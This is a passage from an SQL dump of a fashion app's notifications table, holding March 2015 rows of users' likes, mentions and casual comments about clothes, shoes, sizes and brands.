(220, 10, 154, 26, 'comment', '', '@ryanyang JM is back', '2015-03-23 18:56:52', 1),
(221, 10, 153, 26, 'mention', '', '@ryanyang JM is back', '2015-03-23 18:56:52', 1),
(222, 153, 146, 33, 'comment', '', 'hi Thomas! looks like you lost more weight!', '2015-03-23 19:04:34', 1),
(223, 10, 142, 44, 'like', '', '{"post_id":"44","user_id":"10"}', '2015-03-23 23:29:40', 0),
(224, 35, 10, 16, 'mention', '', '@herbertyang yes that''s why I like it!!! taller and longer legs!', '2015-03-24 11:33:14', 1),
(225, 159, 21, 11, 'comment', '', '@herbertyang konnichiwa! This app looks very cool. Now I''m working on my posts so give me some time.. \\ud83d\\ude09', '2015-03-24 12:04:46', 1),
(226, 159, 10, 11, 'mention', '', '@herbertyang konnichiwa! This app looks very cool. Now I''m working on my posts so give me some time.. \\ud83d\\ude09', '2015-03-24 12:04:46', 1),
(227, 159, 21, 11, 'comment', '', 'I love the left. That sharp pattern makes your legs look thinner and longer. \\ud83d\\ude0a', '2015-03-24 12:17:39', 1),
(228, 159, 35, 16, 'comment', '', '@herbertyang hidden heels are recent trend in sneakers! I have PUMA''s. \\ud83d\\ude04', '2015-03-24 12:20:39', 1),
(229, 159, 10, 16, 'mention', '', '@herbertyang hidden heels are recent trend in sneakers! I have PUMA''s. \\ud83d\\ude04', '2015-03-24 12:20:39', 1),
(230, 21, 159, 11, 'comment_like', '', '{"comment_id":"123","user_id":"21"}', '2015-03-24 14:54:56', 1),
(231, 21, 161, 11, 'comment_like', '', '{"comment_id":"109","user_id":"21"}', '2015-03-24 14:55:12', 1),
(232, 21, 147, 45, 'like', '', '{"post_id":"45","user_id":"21"}', '2015-03-24 14:55:56', 1),
(233, 21, 35, 46, 'like', '', '{"post_id":"46","user_id":"21"}', '2015-03-24 14:57:01', 1),
(234, 21, 35, 46, 'comment', '', 'beautiful!', '2015-03-24 14:57:19', 1),
(235, 21, 147, 45, 'comment', '', 'yeah, the sneakers definitely brighten up the entire outfit! \\ud83d\\udc4d', '2015-03-24 14:58:16', 1),
(236, 33, 21, 11, 'like', '', '{"post_id":"11","user_id":"33"}', '2015-03-24 15:16:05', 1),
(237, 59, 35, 46, 'comment', '', 'Nice.  Why the Brand in the fitting report shows "Gapfit" @herbertyang ', '2015-03-24 15:44:00', 1),
(238, 59, 10, 46, 'mention', '', 'Nice.  Why the Brand in the fitting report shows "Gapfit" @herbertyang ', '2015-03-24 15:44:00', 1),
(239, 59, 21, 11, 'comment', '', 'I love the left one too.  Both the simple pattern and the dark green color with black stripes look safe and appealing on any leg type.', '2015-03-24 15:51:36', 1),
(240, 159, 59, 11, 'comment_like', '', '{"comment_id":"128","user_id":"159"}', '2015-03-24 15:56:13', 1),
(241, 10, 35, 46, 'like', '', '{"post_id":"46","user_id":"10"}', '2015-03-24 16:49:24', 1),
(242, 10, 35, 46, 'comment', '', '@wangyili #gapfit is the activewear house brand under Gap', '2015-03-24 16:50:01', 1),
(243, 10, 59, 46, 'mention', '', '@wangyili #gapfit is the activewear house brand under Gap', '2015-03-24 16:50:01', 1),
(244, 10, 35, 46, 'comment', '', 'haha, the shoulder design...that''s interesting to know', '2015-03-24 16:50:56', 1),
(245, 10, 159, 16, 'comment_like', '', '{"comment_id":"124","user_id":"10"}', '2015-03-24 16:51:12', 1),
(246, 10, 35, 16, 'comment', '', '@namiko I see. where are your #Puma posts dear Namiko? \\ud83d\\ude1d', '2015-03-24 16:51:52', 1),
(247, 10, 159, 16, 'mention', '', '@namiko I see. where are your #Puma posts dear Namiko? \\ud83d\\ude1d', '2015-03-24 16:51:52', 1),
(248, 10, 159, 11, 'comment_like', '', '{"comment_id":"122","user_id":"10"}', '2015-03-24 16:52:37', 1),
(249, 10, 21, 11, 'comment', '', 'everyone is drooling over the left one', '2015-03-24 16:53:17', 1),
(250, 10, 35, 16, 'comment', '', '@jacquelinewu you have seriously manipulated my years of perception on you', '2015-03-24 16:53:57', 1),
(251, 10, 35, 16, 'mention', '', '@jacquelinewu you have seriously manipulated my years of perception on you', '2015-03-24 16:53:57', 1),
(252, 10, 154, 27, 'comment', '', '@jbraden you need some low-rise socks to go with the shoes my friend ', '2015-03-24 16:55:08', 1),
(253, 10, 154, 27, 'mention', '', '@jbraden you need some low-rise socks to go with the shoes my friend ', '2015-03-24 16:55:09', 1),
(254, 10, 153, 42, 'like', '', '{"post_id":"42","user_id":"10"}', '2015-03-24 16:55:32', 1),
(255, 10, 153, 42, 'comment', '', 'it looks comfy ... only 3 stars? you are critical man', '2015-03-24 16:56:44', 1),
(256, 10, 153, 41, 'comment', '', '@ryanyang currently there is no way to edit a post (may add that into future updates) after it''s posted. sorry!', '2015-03-24 16:58:27', 1),
(257, 10, 153, 41, 'mention', '', '@ryanyang currently there is no way to edit a post (may add that into future updates) after it''s posted. sorry!', '2015-03-24 16:58:27', 1),
(258, 10, 153, 41, 'like', '', '{"post_id":"41","user_id":"10"}', '2015-03-24 16:59:01', 1),
(259, 10, 153, 40, 'like', '', '{"post_id":"40","user_id":"10"}', '2015-03-24 16:59:56', 1),
(260, 10, 153, 40, 'comment', '', 'I notice that for the same brand #crockettandjones you have different sizes from 8, 8.5 and 9', '2015-03-24 17:01:26', 1),
(261, 10, 153, 40, 'comment', '', 'is this going to be too warm to wear in California?', '2015-03-24 17:01:59', 1),
(262, 159, 35, 16, 'comment', '', '@herbertyang you''ll see soon.. \\ud83d\\ude09', '2015-03-24 17:02:05', 1),
(263, 159, 10, 16, 'mention', '', '@herbertyang you''ll see soon.. \\ud83d\\ude09', '2015-03-24 17:02:06', 1),
(264, 10, 153, 39, 'like', '', '{"post_id":"39","user_id":"10"}', '2015-03-24 17:02:10', 1),
(265, 10, 153, 39, 'comment', '', 'I''ll pay more attention to JB''s shoes for the next 007 movie', '2015-03-24 17:03:05', 1),
(266, 10, 153, 38, 'like', '', '{"post_id":"38","user_id":"10"}', '2015-03-24 17:03:24', 1),
(267, 10, 153, 38, 'comment', '', 'you are owning the market of this brand dude', '2015-03-24 17:03:55', 1),
(268, 10, 153, 39, 'reshare', '', '{"post_id":"39","user_id":"10"}', '2015-03-24 17:04:16', 1),
(269, 10, 59, 30, 'reshare', '', '{"post_id":"30","user_id":"10"}', '2015-03-24 17:04:49', 1),
(270, 10, 21, 45, 'comment_like', '', '{"comment_id":"126","user_id":"10"}', '2015-03-24 17:05:26', 1),
(271, 10, 147, 45, 'comment', '', 'you have a thing for light blue color', '2015-03-24 17:05:40', 1),
(272, 10, 147, 45, 'like', '', '{"post_id":"45","user_id":"10"}', '2015-03-24 17:05:43', 1),
(273, 10, 49, 29, 'comment', '', '@xizhang it''s just me. I''m lazy and elusive.', '2015-03-24 17:06:11', 0),
(274, 10, 49, 29, 'mention', '', '@xizhang it''s just me. I''m lazy and elusive.', '2015-03-24 17:06:11', 0),
(275, 10, 146, 33, 'comment', '', '@ryanyang I bet he was holding his breath really tight ', '2015-03-24 17:07:14', 1),
(276, 10, 153, 33, 'mention', '', '@ryanyang I bet he was holding his breath really tight ', '2015-03-24 17:07:14', 1),
(277, 10, 142, 44, 'comment', '', 'what a familiar belly button! it reminds me of days of our past... is this swimming shorts easy to fall off?', '2015-03-24 17:09:25', 0),
(278, 160, 147, 34, 'like', '', '{"post_id":"34","user_id":"160"}', '2015-03-24 20:53:02', 1),
(279, 35, 59, 46, 'mention', '', '@wangyili because I have to choose a brand but my brand is not on the list :( @herbertyang ', '2015-03-24 22:40:32', 1),
(280, 35, 10, 46, 'mention', '', '@wangyili because I have to choose a brand but my brand is not on the list :( @herbertyang ', '2015-03-24 22:40:32', 1),
(281, 10, 35, 46, 'comment', '', '@jacquelinewu you can actually enter any brand you want. on the brand menu, instead of picking 1 out of 15, just enter a brand name and it''ll be recorded in the database and become searchable as well.', '2015-03-24 22:42:18', 1),
(282, 10, 35, 46, 'mention', '', '@jacquelinewu you can actually enter any brand you want. on the brand menu, instead of picking 1 out of 15, just enter a brand name and it''ll be recorded in the database and become searchable as well.', '2015-03-24 22:42:18', 1),
(283, 21, 59, 11, 'comment_like', '', '{"comment_id":"128","user_id":"21"}', '2015-03-25 00:35:15', 1),
(284, 10, 154, 25, 'reshare', '', '{"post_id":"25","user_id":"10"}', '2015-03-25 02:57:32', 1),
(285, 10, 58, 47, 'like', '', '{"post_id":"47","user_id":"10"}', '2015-03-25 02:57:50', 1),
(286, 10, 35, 46, 'reshare', '', '{"post_id":"46","user_id":"10"}', '2015-03-25 02:58:08', 1),
(287, 10, 150, 48, 'like', '', '{"post_id":"48","user_id":"10"}', '2015-03-25 03:32:23', 1),
(288, 10, 150, 48, 'comment', '', 'wow! that''s .... outstanding!', '2015-03-25 03:32:52', 1),
(289, 10, 59, 30, 'comment', '', '@zxjulia I wonder what''s the BMS between you two', '2015-03-25 03:41:09', 1),
(290, 10, 150, 30, 'mention', '', '@zxjulia I wonder what''s the BMS between you two', '2015-03-25 03:41:09', 1),
(291, 153, 10, 46, 'comment_like', '', '{"comment_id":"129","user_id":"153"}', '2015-03-25 03:58:34', 1),
(292, 153, 35, 46, 'comment', '', 'you look great in it!', '2015-03-25 03:59:01', 1),
(293, 21, 10, 49, 'like', '', '{"post_id":"49","user_id":"21"}', '2015-03-25 04:11:43', 1),
(294, 10, 159, 16, 'comment_like', '', '{"comment_id":"140","user_id":"10"}', '2015-03-25 04:13:38', 1),
(295, 10, 150, 48, 'comment', '', '@namiko somebody just beat you to claim the world first on #Puma', '2015-03-25 04:14:28', 1),
(296, 10, 159, 48, 'mention', '', '@namiko somebody just beat you to claim the world first on #Puma', '2015-03-25 04:14:28', 1),
(297, 10, 49, 3, 'comment_like', '', '{"comment_id":"111","user_id":"10"}', '2015-03-25 04:15:04', 0),
(298, 21, 150, 48, 'like', '', '{"post_id":"48","user_id":"21"}', '2015-03-25 04:16:42', 1),
(299, 21, 150, 48, 'comment', '', 'wow...super hot!', '2015-03-25 04:17:06', 1),
(300, 21, 150, 48, 'reshare', '', '{"post_id":"48","user_id":"21"}', '2015-03-25 04:17:23', 1),
(301, 21, 58, 47, 'like', '', '{"post_id":"47","user_id":"21"}', '2015-03-25 04:21:09', 1),
(302, 21, 58, 47, 'comment', '', 'I like the simple design and the cut fits you very well. ', '2015-03-25 04:21:50', 1),
(303, 159, 150, 48, 'comment', '', '@herbertyang haha, I appreciate that Linkqlo will have at least two PUMAs soon.', '2015-03-25 04:35:40', 1),
(304, 159, 10, 48, 'mention', '', '@herbertyang haha, I appreciate that Linkqlo will have at least two PUMAs soon.', '2015-03-25 04:35:40', 1),
(305, 10, 159, 48, 'comment_like', '', '{"comment_id":"158","user_id":"10"}', '2015-03-25 04:37:32', 1),
(306, 10, 157, 50, 'like', '', '{"post_id":"50","user_id":"10"}', '2015-03-25 04:53:35', 1),
(307, 10, 157, 50, 'comment', '', 'my goodness, this is a tough yoga pose...\\ud83d\\ude2e', '2015-03-25 04:54:05', 1),
(308, 10, 157, 50, 'comment', '', '@wildsheepchase she''s arrived, finally', '2015-03-25 04:57:21', 1),
(309, 10, 21, 50, 'mention', '', '@wildsheepchase she''s arrived, finally', '2015-03-25 04:57:21', 1),
(310, 21, 157, 50, 'like', '', '{"post_id":"50","user_id":"21"}', '2015-03-25 05:17:35', 1),
(311, 21, 157, 50, 'comment', '', 'hi hi!', '2015-03-25 05:17:45', 1),
(312, 10, 21, 49, 'mention', '', '@wildsheepchase @guodan @daniel @echohwj you can discuss here', '2015-03-25 05:30:30', 1),
(313, 10, 145, 49, 'mention', '', '@wildsheepchase @guodan @daniel @echohwj you can discuss here', '2015-03-25 05:30:30', 0),
(314, 10, 80, 49, 'mention', '', '@wildsheepchase @guodan @daniel @echohwj you can discuss here', '2015-03-25 05:30:31', 1),
(315, 10, 147, 49, 'mention', '', '@wildsheepchase @guodan @daniel @echohwj you can discuss here', '2015-03-25 05:30:31', 1),
(316, 10, 156, 51, 'like', '', '{"post_id":"51","user_id":"10"}', '2015-03-25 05:36:21', 0),
(317, 10, 153, 38, 'comment_like', '', '{"comment_id":"145","user_id":"10"}', '2015-03-25 06:25:44', 1),
(318, 10, 159, 57, 'like', '', '{"post_id":"57","user_id":"10"}', '2015-03-25 07:43:57', 1),
(319, 10, 159, 56, 'like', '', '{"post_id":"56","user_id":"10"}', '2015-03-25 07:44:07', 1),
(320, 10, 159, 57, 'comment', '', '#nike is everyone''s fav', '2015-03-25 07:45:09', 1),
(321, 10, 159, 56, 'comment', '', 'very stylish indeed! I used to have a cool #Puma too', '2015-03-25 07:45:55', 1),
(322, 10, 148, 55, 'like', '', '{"post_id":"55","user_id":"10"}', '2015-03-25 07:46:29', 1),
(323, 10, 148, 54, 'comment', '', 'you can try to upload multiple pictures in one post for better effect', '2015-03-25 07:47:05', 1),
(324, 10, 148, 52, 'comment', '', 'for running?', '2015-03-25 07:48:21', 1),
(325, 10, 148, 52, 'like', '', '{"post_id":"52","user_id":"10"}', '2015-03-25 07:48:23', 1),
(326, 21, 159, 57, 'comment', '', 'I love the neon yellow/grey color combination. the tights look good, too! and 1.5 on treadmill - you are hard core! \\ud83d\\udc4d', '2015-03-25 07:49:27', 1),
(327, 21, 159, 57, 'like', '', '{"post_id":"57","user_id":"21"}', '2015-03-25 07:49:54', 1),
(328, 21, 159, 56, 'like', '', '{"post_id":"56","user_id":"21"}', '2015-03-25 07:50:56', 1),
(329, 159, 10, 57, 'mention', '', '@herbertyang indeed!', '2015-03-25 07:53:40', 1),
(330, 10, 21, 57, 'comment_like', '', '{"comment_id":"167","user_id":"10"}', '2015-03-25 07:55:15', 1),
(331, 159, 21, 57, 'mention', '', '@wildsheepchase not that hard, I''m just walking. \\ud83d\\ude01 I love the color too. yellow/grey is one of my most favorite color combination!', '2015-03-25 08:03:35', 1),
(332, 159, 10, 56, 'comment_like', '', '{"comment_id":"164","user_id":"159"}', '2015-03-25 08:04:10', 1),
(333, 10, 153, 40, 'comment_like', '', '{"comment_id":"144","user_id":"10"}', '2015-03-25 08:06:20', 1),
(334, 10, 153, 40, 'comment_like', '', '{"comment_id":"141","user_id":"10"}', '2015-03-25 08:06:22', 1),
(335, 159, 10, 56, 'mention', '', '@herbertyang did it have hidden heel? \\ud83d\\ude1d', '2015-03-25 08:09:49', 1),
(336, 10, 161, 60, 'like', '', '{"post_id":"60","user_id":"10"}', '2015-03-25 16:46:12', 1),
(337, 10, 161, 60, 'comment', '', 'among other things, this is a great photo shot...studio-level \\ud83d\\udc4d\\ud83d\\udc4d', '2015-03-25 16:47:10', 1),
(338, 10, 161, 60, 'comment', '', 'yeah #nike ''s #dri-fit has a lot of love around the room', '2015-03-25 16:47:53', 1),
(339, 10, 161, 60, 'comment', '', 'your choices in the fitting report seem to suggest the fitting is fine...', '2015-03-25 16:48:57', 1),
(340, 10, 161, 59, 'like', '', '{"post_id":"59","user_id":"10"}', '2015-03-25 16:49:14', 1),
(341, 10, 161, 59, 'comment', '', 'this one got some heavy Chinese flavor ', '2015-03-25 16:51:32', 1),
(342, 10, 159, 56, 'comment', '', '@namiko it seems so...@jacquelinewu has one pair with hidden heel', '2015-03-25 16:52:21', 1),
(343, 10, 159, 56, 'mention', '', '@namiko it seems so...@jacquelinewu has one pair with hidden heel', '2015-03-25 16:52:22', 1),
(344, 10, 35, 56, 'mention', '', '@namiko it seems so...@jacquelinewu has one pair with hidden heel', '2015-03-25 16:52:22', 1),
(345, 10, 151, 58, 'like', '', '{"post_id":"58","user_id":"10"}', '2015-03-25 16:53:50', 1),
(346, 10, 151, 58, 'comment', '', 'what size is this?', '2015-03-25 16:54:30', 1),
(347, 10, 148, 53, 'like', '', '{"post_id":"53","user_id":"10"}', '2015-03-25 16:55:00', 1),
(348, 10, 148, 52, 'comment', '', '@martin many #asics lovers here', '2015-03-25 16:55:37', 1),
(349, 10, 148, 52, 'mention', '', '@martin many #asics lovers here', '2015-03-25 16:55:37', 1),
(350, 10, 161, 60, 'reshare', '', '{"post_id":"60","user_id":"10"}', '2015-03-25 17:11:42', 1),
(351, 10, 159, 57, 'comment_like', '', '{"comment_id":"169","user_id":"10"}', '2015-03-25 17:12:51', 1),
(352, 10, 162, 64, 'like', '', '{"post_id":"64","user_id":"10"}', '2015-03-25 18:27:56', 1),
(353, 10, 172, 67, 'comment', '', 'yeah, a world-first on jeans! \\ud83d\\udc4d\\ud83d\\udc4d\\ud83d\\udc4a', '2015-03-25 18:28:27', 1),
(354, 10, 172, 67, 'like', '', '{"post_id":"67","user_id":"10"}', '2015-03-25 18:28:31', 1),
(355, 10, 172, 67, 'comment', '', '"makes nice sound in washing machine"...LOL \\ud83d\\ude04', '2015-03-25 18:29:47', 1),
(356, 10, 172, 63, 'like', '', '{"post_id":"63","user_id":"10"}', '2015-03-25 18:30:06', 1),
(357, 10, 172, 63, 'comment', '', '@ryanyang more shoe lovers', '2015-03-25 18:31:45', 1),
(358, 10, 153, 63, 'mention', '', '@ryanyang more shoe lovers', '2015-03-25 18:31:45', 1),
(359, 10, 162, 61, 'like', '', '{"post_id":"61","user_id":"10"}', '2015-03-25 18:32:43', 1),
(360, 153, 172, 63, 'comment', '', 'very nice!', '2015-03-25 18:32:58', 1),
(361, 10, 162, 66, 'comment', '', '@wildsheepchase professional has arrived', '2015-03-25 19:37:58', 1),
(362, 10, 21, 66, 'mention', '', '@wildsheepchase professional has arrived', '2015-03-25 19:37:58', 1),
(363, 10, 162, 61, 'reshare', '', '{"post_id":"61","user_id":"10"}', '2015-03-25 19:38:47', 1),
(364, 174, 35, 46, 'comment', '', 'what do you mean by thicker arms?!', '2015-03-25 21:10:59', 1),
(365, 174, 35, 46, 'like', '', '{"post_id":"46","user_id":"174"}', '2015-03-25 21:13:33', 1),
(366, 174, 21, 10, 'like', '', '{"post_id":"10","user_id":"174"}', '2015-03-25 21:14:03', 1),
(367, 175, 174, 68, 'like', '', '{"post_id":"68","user_id":"175"}', '2015-03-25 21:53:03', 1),
(368, 175, 174, 68, 'comment', '', 'love the colors!', '2015-03-25 21:53:14', 1),
(369, 21, 162, 66, 'like', '', '{"post_id":"66","user_id":"21"}', '2015-03-26 00:04:23', 1),
(370, 21, 162, 65, 'like', '', '{"post_id":"65","user_id":"21"}', '2015-03-26 00:08:49', 1),
(371, 10, 174, 68, 'like', '', '{"post_id":"68","user_id":"10"}', '2015-03-26 00:10:45', 1),
(372, 21, 174, 68, 'like', '', '{"post_id":"68","user_id":"21"}', '2015-03-26 00:11:29', 1),
(373, 21, 156, 51, 'like', '', '{"post_id":"51","user_id":"21"}', '2015-03-26 00:12:10', 0),
(374, 21, 172, 67, 'comment', '', 'haha, very funny. ', '2015-03-26 00:17:35', 1),
(375, 21, 162, 61, 'like', '', '{"post_id":"61","user_id":"21"}', '2015-03-26 00:17:54', 1),
(376, 21, 161, 59, 'comment', '', 'very nice - I actually added this to my wish list in my Zara online shopping cart. haha', '2015-03-26 00:19:50', 1),
(377, 21, 161, 60, 'comment', '', 'it looks good on you. you didn''t get it? BTW, the lighting is terrific.', '2015-03-26 00:21:20', 1),
(378, 10, 172, 67, 'reshare', '', '{"post_id":"67","user_id":"10"}', '2015-03-26 00:22:24', 1),
(379, 21, 162, 62, 'comment', '', 'this looks very good.', '2015-03-26 00:24:08', 1),
(380, 161, 21, 60, 'mention', '', '@wildsheepchase too tight. I need an XL. no stock', '2015-03-26 00:30:40', 1),
(381, 150, 161, 60, 'like', '', '{"post_id":"60","user_id":"150"}', '2015-03-26 00:43:14', 1),
(382, 21, 150, 69, 'like', '', '{"post_id":"69","user_id":"21"}', '2015-03-26 00:59:45', 1),
(383, 21, 150, 69, 'comment', '', 'fits very nice. why not for sports? ', '2015-03-26 01:00:51', 1),
(384, 21, 159, 56, 'comment', '', 'looking perfect with black skinny jeans.', '2015-03-26 01:04:13', 1),
(385, 150, 21, 69, 'mention', '', '@wildsheepchase Sorry, maybe it is good for sports but not all the sports. The only sports I do is running. So, I think I should say it''s not good for running. ', '2015-03-26 01:05:22', 1),
(386, 21, 148, 54, 'like', '', '{"post_id":"54","user_id":"21"}', '2015-03-26 03:14:29', 1),
(387, 10, 150, 69, 'comment', '', 'LOL, every part is either too short or too tight, except for length. it looks good on you. ', '2015-03-26 03:22:45', 1),
(388, 10, 150, 69, 'like', '', '{"post_id":"69","user_id":"10"}', '2015-03-26 03:22:56', 1),
(389, 159, 21, 56, 'comment_like', '', '{"comment_id":"193","user_id":"159"}', '2015-03-26 03:52:39', 1),
(390, 159, 10, 56, 'comment_like', '', '{"comment_id":"176","user_id":"159"}', '2015-03-26 03:52:42', 1),
(391, 10, 162, 61, 'comment', '', 'I need to get one like this', '2015-03-26 04:34:50', 1),
(392, 151, 10, 58, 'mention', '', '@herbertyang it is 43 but fits me. I am usually 42. ', '2015-03-26 05:15:42', 1),
(393, 10, 151, 58, 'comment', '', '@sicheng fitting report would be helpful here', '2015-03-26 05:17:40', 1),
(394, 10, 151, 58, 'mention', '', '@sicheng fitting report would be helpful here', '2015-03-26 05:17:40', 1),
(396, 10, 148, 73, 'like', '', '{"post_id":"73","user_id":"10"}', '2015-03-26 07:13:34', 1),
(397, 10, 148, 73, 'comment', '', 'cute socks', '2015-03-26 07:13:47', 1),
(398, 10, 148, 74, 'comment', '', '@martin ain''t they all...\\ud83d\\ude1d', '2015-03-26 07:14:26', 1),
(399, 10, 148, 74, 'mention', '', '@martin ain''t they all...\\ud83d\\ude1d', '2015-03-26 07:14:26', 1),
(400, 10, 21, 71, 'like', '', '{"post_id":"71","user_id":"10"}', '2015-03-26 07:15:37', 1),
(401, 10, 21, 71, 'comment', '', 'very bohemian ', '2015-03-26 07:16:01', 1),
(402, 10, 148, 72, 'like', '', '{"post_id":"72","user_id":"10"}', '2015-03-26 07:16:14', 1),
(403, 10, 148, 72, 'comment', '', 'goes well with your socks', '2015-03-26 07:16:34', 1),
(404, 10, 172, 67, 'comment', '', 'keep the stories coming my friend ', '2015-03-26 07:17:29', 1),
(405, 174, 21, 5, 'like', '', '{"post_id":"5","user_id":"174"}', '2015-03-26 07:17:59', 1),
(406, 10, 174, 68, 'comment', '', '@tibuke #nike just has unlimited color combinations ', '2015-03-26 07:18:39', 1),
(407, 10, 174, 68, 'mention', '', '@tibuke #nike just has unlimited color combinations ', '2015-03-26 07:18:39', 1),
(408, 10, 162, 66, 'like', '', '{"post_id":"66","user_id":"10"}', '2015-03-26 07:19:09', 1),
(409, 10, 162, 64, 'comment', '', 'goose down...must be really comfortable ', '2015-03-26 07:20:31', 1),
(410, 10, 162, 65, 'like', '', '{"post_id":"65","user_id":"10"}', '2015-03-26 07:20:47', 1),
(411, 10, 162, 65, 'comment', '', '#adidas once a great brand, its store is doing badly compared to #nike ', '2015-03-26 07:22:22', 1),
(412, 10, 162, 62, 'like', '', '{"post_id":"62","user_id":"10"}', '2015-03-26 07:22:36', 1),
(413, 10, 162, 62, 'comment', '', '@wildsheepchase it looks like those space suits from Star Trek movies', '2015-03-26 07:23:21', 1),
(414, 10, 21, 62, 'mention', '', '@wildsheepchase it looks like those space suits from Star Trek movies', '2015-03-26 07:23:21', 1),
(415, 21, 10, 71, 'comment_like', '', '{"comment_id":"204","user_id":"21"}', '2015-03-26 07:24:38', 1),
(416, 10, 172, 63, 'comment', '', '@wildsheepchase #colehaan has #nike air in it! ', '2015-03-26 07:26:19', 1),
(417, 10, 21, 63, 'mention', '', '@wildsheepchase #colehaan has #nike air in it! ', '2015-03-26 07:26:19', 1),
(418, 10, 156, 51, 'comment', '', '@horseferry here''s another #colehaan', '2015-03-26 07:27:55', 0),
(419, 10, 172, 51, 'mention', '', '@horseferry here''s another #colehaan', '2015-03-26 07:27:55', 1),
(420, 10, 162, 66, 'comment', '', 'cute design', '2015-03-26 07:33:12', 1),
(421, 21, 172, 63, 'comment', '', '@herbertyang yeah, till Nike sold Cole Haan a while ago. I had a pair of Cole Haan sandals with Nike Air - crazy comfortable.  ', '2015-03-26 07:40:17', 1),
(422, 21, 10, 63, 'mention', '', '@herbertyang yeah, till Nike sold Cole Haan a while ago. I had a pair of Cole Haan sandals with Nike Air - crazy comfortable.  ', '2015-03-26 07:40:17', 1),
(423, 159, 21, 71, 'comment', '', 'I love this skirt! That bias pattern makes you look taller. Actually I thought of buying this.', '2015-03-26 11:01:23', 1),
(424, 159, 154, 24, 'comment', '', 'nice color! it looks great on you.', '2015-03-26 11:04:13', 1),
(425, 21, 159, 71, 'comment_like', '', '{"comment_id":"215","user_id":"21"}', '2015-03-26 11:54:35', 1),
(426, 162, 10, 49, 'like', '', '{"post_id":"49","user_id":"162"}', '2015-03-26 13:15:39', 1),
(427, 10, 151, 76, 'like', '', '{"post_id":"76","user_id":"10"}', '2015-03-26 17:11:28', 1),
(428, 10, 151, 76, 'reshare', '', '{"post_id":"76","user_id":"10"}', '2015-03-26 17:12:49', 1),
(429, 10, 151, 76, 'comment', '', 'very suave!', '2015-03-26 17:13:29', 1),
(430, 10, 147, 75, 'like', '', '{"post_id":"75","user_id":"10"}', '2015-03-26 17:15:13', 1),
(431, 10, 147, 75, 'comment', '', 'any picture of its inside layer when it''s reversed?', '2015-03-26 17:16:11', 1),
(432, 10, 159, 71, 'comment_like', '', '{"comment_id":"215","user_id":"10"}', '2015-03-26 17:16:48', 1),
(433, 10, 21, 71, 'comment', '', '@namiko haha, yeah...the visual misconception ', '2015-03-26 17:17:33', 1),
(434, 10, 159, 71, 'mention', '', '@namiko haha, yeah...the visual misconception ', '2015-03-26 17:17:33', 1),
(435, 59, 21, 71, 'like', '', '{"post_id":"71","user_id":"59"}', '2015-03-26 20:28:36', 1),
(436, 59, 150, 48, 'like', '', '{"post_id":"48","user_id":"59"}', '2015-03-26 20:33:53', 1),
(437, 10, 173, 80, 'like', '', '{"post_id":"80","user_id":"10"}', '2015-03-26 21:13:05', 1),
(438, 10, 173, 80, 'comment', '', '#underarmor is having quite a surge lately, with The Rock in all fast furious movies and their endorsement battle with #nike on NBA superstars', '2015-03-26 21:14:25', 1),
(439, 10, 173, 77, 'like', '', '{"post_id":"77","user_id":"10"}', '2015-03-26 21:14:48', 1),
(440, 10, 173, 78, 'comment', '', 'I like the texture and the blue pattern on the shoulder...looking nice!', '2015-03-26 21:16:20', 1),
(441, 10, 173, 78, 'like', '', '{"post_id":"78","user_id":"10"}', '2015-03-26 21:16:29', 1),
(442, 10, 173, 79, 'like', '', '{"post_id":"79","user_id":"10"}', '2015-03-26 21:17:18', 1),
(443, 10, 173, 79, 'comment', '', 'it fits you well', '2015-03-26 21:17:34', 1),
(444, 10, 151, 76, 'comment', '', 'it does seem to fit you very well...you''re going to wear it in SF bay when you come over?', '2015-03-26 21:20:38', 1),
(445, 10, 173, 77, 'reshare', '', '{"post_id":"77","user_id":"10"}', '2015-03-26 21:21:00', 1),
(446, 21, 151, 76, 'like', '', '{"post_id":"76","user_id":"21"}', '2015-03-27 00:30:17', 0),
(447, 21, 147, 75, 'like', '', '{"post_id":"75","user_id":"21"}', '2015-03-27 00:31:13', 1),
(448, 10, 174, 81, 'like', '', '{"post_id":"81","user_id":"10"}', '2015-03-27 00:34:21', 0),
(449, 150, 21, 71, 'like', '', '{"post_id":"71","user_id":"150"}', '2015-03-27 02:10:17', 1),
(450, 150, 21, 71, 'comment', '', 'you introduced this brand to me the year before last, and I fall in love with it immediately. it''s colorful and comfortable, and you will find one fit for your body always. ', '2015-03-27 02:19:10', 1),
(451, 58, 159, 57, 'like', '', '{"post_id":"57","user_id":"58"}', '2015-03-27 03:01:07', 1),
(452, 10, 174, 81, 'comment', '', 'great shot!', '2015-03-27 03:02:03', 0);
INSERT INTO `notifications` (`notification_id`, `from_id`, `to_id`, `post_id`, `type`, `message`, `content`, `created`, `read`) VALUES
(453, 161, 21, 71, 'comment', '', 'u look gorgeous! ', '2015-03-27 03:18:23', 1),
(454, 21, 161, 82, 'like', '', '{"post_id":"82","user_id":"21"}', '2015-03-27 05:34:14', 1),
(455, 21, 150, 71, 'comment_like', '', '{"comment_id":"224","user_id":"21"}', '2015-03-27 05:35:22', 1),
(456, 21, 150, 71, 'mention', '', '@zxjulia glad u like it. \\ud83d\\ude0a', '2015-03-27 05:36:04', 1),
(457, 21, 161, 71, 'comment_like', '', '{"comment_id":"226","user_id":"21"}', '2015-03-27 05:36:08', 1),
(458, 21, 161, 82, 'comment', '', 'they do fit very well!', '2015-03-27 05:57:01', 1),
(459, 21, 173, 80, 'like', '', '{"post_id":"80","user_id":"21"}', '2015-03-27 06:02:57', 1),
(460, 21, 173, 80, 'comment', '', 'nice color!', '2015-03-27 06:03:11', 1),
(461, 21, 173, 78, 'comment', '', 'good deal!', '2015-03-27 06:04:43', 1),
(462, 21, 174, 81, 'like', '', '{"post_id":"81","user_id":"21"}', '2015-03-27 06:05:04', 0),
(463, 21, 174, 81, 'comment', '', 'the shoes go very well with the pale pink jeans. \\ud83d\\ude0a', '2015-03-27 06:05:58', 0),
(464, 10, 173, 77, 'comment', '', 'great review @jananagy !', '2015-03-27 07:42:23', 0),
(465, 10, 173, 77, 'mention', '', 'great review @jananagy !', '2015-03-27 07:42:23', 0),
(466, 181, 35, 46, 'comment', '', 'pretty', '2015-03-27 21:59:23', 1),
(467, 181, 35, 46, 'like', '', '{"post_id":"46","user_id":"181"}', '2015-03-27 21:59:28', 1),
(468, 10, 58, 84, 'like', '', '{"post_id":"84","user_id":"10"}', '2015-03-27 22:45:31', 1),
(469, 10, 58, 84, 'comment', '', 'it goes well with the light grey t-shirt ', '2015-03-27 22:46:28', 1),
(470, 10, 166, 83, 'like', '', '{"post_id":"83","user_id":"10"}', '2015-03-27 22:46:41', 0),
(471, 10, 166, 83, 'comment', '', 'good for moderate hiking as well?', '2015-03-27 22:48:06', 0),
